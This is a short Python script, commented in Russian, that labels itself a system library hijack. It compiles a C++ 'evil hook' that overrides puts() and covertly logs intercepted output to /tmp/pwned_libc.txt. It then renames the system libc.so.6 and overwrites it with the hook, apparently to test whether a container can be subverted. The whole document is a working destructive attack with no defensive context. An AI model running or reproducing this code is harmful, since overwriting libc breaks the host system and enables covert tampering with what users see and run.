import os
import subprocess

# Путь к хуку (твоя злая библиотека)
EVIL_LIB_SOURCE = r"""
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

// Подменяем стандартный puts
extern "C" int puts(const char *str) {
    // Скрытно пишем в лог, что мы перехватили вывод
    int fd = open("/tmp/pwned_libc.txt", O_WRONLY | O_CREAT | O_APPEND, 0666);
    write(fd, "Intercepted: ", 13);
    write(fd, str, 32); // Пишем кусок строки
    write(fd, "\n", 1);
    close(fd);

    // Вызываем настоящий вывод (упрощенно)
    return printf("%s\n", str);
}
"""

def overwrite_system_libs():
    print("[!] Attempting System Library Hijack...")
    
    # 1. Находим, где лежит libc
    try:
        libc_path = subprocess.check_output("ldd /bin/ls | grep libc.so.6 | awk '{print $3}'", shell=True).decode().strip()
        print(f"[+] Found libc at: {libc_path}")
    except:
        print("[-] Could not find libc path.")
        return

    # 2. Компилируем наш хук
    with open("/tmp/evil_hook.cpp", "w") as f:
        f.write(EVIL_LIB_SOURCE)
    
    try:
        subprocess.run(["g++", "-fPIC", "-shared", "-o", "/tmp/evil_hook.so", "/tmp/evil_hook.cpp"], check=True)
        print("[+] Compiled evil hook.")
    except:
        print("[-] Compilation failed.")
        return

    # 3. Самый опасный момент: Перезапись или подмена через символическую ссылку
    # В контейнерах часто libc — это симлинк. Мы можем его перенаправить.
    try:
        # Пробуем создать бэкап (если root позволит)
        os.rename(libc_path, libc_path + ".bak")
        # Ставим свою библиотеку на место системной
        subprocess.run(["cp", "/tmp/evil_hook.so", libc_path], check=True)
        print(f"[CRITICAL] {libc_path} HAS BEEN OVERWRITTEN.")
    except Exception as e:
        print(f"[-] Overwrite failed: {e}. (Likely Read-only FS or Busy file)")

    # 4. Проверка: запуск любой команды
    print("[!] Testing hijack with 'ls'...")
    subprocess.run(["ls", "/"])

if __name__ == "__main__":
    overwrite_system_libs()
